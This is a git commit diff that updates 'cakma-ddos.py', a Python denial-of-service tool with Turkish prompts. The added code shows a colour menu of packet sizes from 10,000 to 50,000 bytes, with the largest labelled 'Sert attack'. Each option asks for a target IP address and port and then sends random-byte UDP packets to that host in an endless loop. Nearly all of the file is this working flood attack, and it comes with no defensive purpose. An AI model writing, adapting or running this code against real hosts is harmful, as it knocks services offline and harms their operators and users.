9f378954127eacd1f1973f34eb859c43763f1d96
cakma_hack3r <91216396+cakmahacker@users.noreply.github.com>
2022-02-23 20:53:33 +0400

    Update cakma-ddos.py

--- cakma-ddos.py
+++ cakma-ddos.py
@@ -1,22 +1,83 @@
 import os
 import random 
 import socket
-
+import colorama
+from colorama import Fore, Back, Style
+os.system ('python -m pip install colorama')
 os.system ('clear')
 os.system ('pkg install figlet')
-os.system ('clear')
-os.system ('figlet Cakma DDOS')
+os.system('clear')
+os.system ('figlet CAKMA-DDOS')
 
-print ("40.000 byte")
+print(Fore.GREEN)
+print ('     1- 10.000 bayt [Başlangıç]')
+print ('     2- 20.000 bayt [Başlangıç]')
+print(Fore.YELLOW)
+print ('     3- 30.000 bayt [Orta seviye]')
+print ('     4- 40.000 bayt [Güçlü]')
+print(Fore.RED)
+print ('     5- 50.000 bayt [Sert attack]')
 
+print(Fore.WHITE)
+ddos = input("Seçenek giriniz > ")
+if(ddos=="1"):
+		
+		hedef_ip = str(input("Hedef ip giriniz > "))
+		hedef_port = int(input("Hedef port giriniz > "))
 
-ddos = input("Başlatmak İçin Enter > ")
-if(ddos==""):
+		bytes = random._urandom(10000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(hedef_ip, hedef_port))
+			sayac = sayac+1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(ddos=="2"):
+		
+		hedef_ip = str(input("Hedef ip giriniz > "))
+		hedef_port = int(input("Hedef port giriniz > "))
+
+		bytes = random._urandom(20000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(hedef_ip, hedef_port))
+			sayac = sayac+1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(ddos=="3"):
+		
+		hedef_ip = str(input("Hedef ip giriniz > "))
+		hedef_port = int(input("Hedef port giriniz > "))
+
+		bytes = random._urandom(30000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(hedef_ip, hedef_port))
+			sayac = sayac+1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(ddos=="4"):
 		
 		hedef_ip = str(input("Hedef ip giriniz > "))
 		hedef_port = int(input("Hedef port giriniz > "))
 
 		bytes = random._urandom(40000)
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sayac = 0
+		while True:
+			sock.sendto(bytes,(hedef_ip, hedef_port))
+			sayac = sayac+1
+			print("Gönderilen paket: %s" %(sayac))
+
+if(ddos=="5"):
+		
+		hedef_ip = str(input("Hedef ip giriniz > "))
+		hedef_port = int(input("Hedef port giriniz > "))
+
+		bytes = random._urandom(50000)
 		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		sayac = 0
 		while True:
